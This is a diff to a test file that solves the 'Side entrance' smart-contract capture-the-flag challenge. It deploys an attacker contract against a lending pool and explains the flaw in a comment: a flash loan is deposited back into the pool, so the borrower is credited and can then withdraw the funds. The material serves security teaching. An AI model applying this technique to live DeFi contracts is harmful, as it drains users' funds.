@@ -25,6 +25,23 @@ describe('[Challenge] Side entrance', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+        const sideEntranceAttackerContractFactory = await ethers.getContractFactory(
+            "SideEntranceAttacker", deployer
+        ); 
+        this.sideEntranceAttacker = await sideEntranceAttackerContractFactory
+            .connect(attacker)
+            .deploy(
+                this.pool.address
+            );
+
+        /* 
+            Vulnerability:
+            The pool.flashLoan and pool.deposit functions may be used to take a flashLoan equal to
+            the pool's balance and simultaneously deposit that loan into the pool. The attacker
+            then has their pool.balances equal to the flashLoan contract balance with the attacker
+            then withdraws.
+        */
+        await this.sideEntranceAttacker.attack();
     });
 
     after(async function () {
